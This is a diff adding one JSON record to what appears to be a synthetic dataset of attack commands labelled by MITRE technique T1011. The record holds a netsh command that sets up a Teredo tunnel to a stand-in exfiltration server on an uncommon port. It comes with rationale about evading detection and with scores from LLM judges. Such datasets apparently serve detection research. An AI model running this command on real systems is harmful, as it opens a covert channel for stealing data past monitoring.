@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh interface teredo set state type=enterpriseclient servername=teredo.exfil.tld clientport=60445",
+  "explanation": "Enables Teredo with a custom server and high, uncommon UDP client port to establish an IPv6-over-IPv4 tunnel as an alternate medium for exfiltration, aligning with T1011.",
+  "rationale_steps": [
+    "Configure Teredo to create an IPv6 tunnel over IPv4/UDP, providing a non-primary channel.",
+    "Use a non-standard client port (60445) to evade simple detections.",
+    "Traffic over Teredo can carry exfil data outside normal monitored IPv4 paths."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-b376dc3c",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed netsh teredo command with valid parameters (type, servername, clientport) and no quoting or parsing issues.",
+        "semantic_score": 2,
+        "semantic_justification": "It configures a Teredo tunnel with a custom server/port but neither automates nor conducts exfiltration and likely requires elevated privileges, so it only indirectly supports the stated technique.",
+        "combined_score": 3.5,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T02:17:21.312307Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct netsh syntax, proper parameter names, valid values, and appropriate structure for configuring Teredo.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly configures Teredo tunneling with a custom exfiltration server and non-standard port which could enable automated exfiltration over IPv6, though actual data transfer would require additional commands.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:17:24.491288Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses correct `netsh` syntax with valid parameters and values for configuring the Teredo interface.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly configures Teredo for an exfiltration tunnel as an alternative transfer method, aligning with T1011, though the stated privilege requirement of 'None' is incorrect as it typically requires administrative privileges.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T02:17:48.662051Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
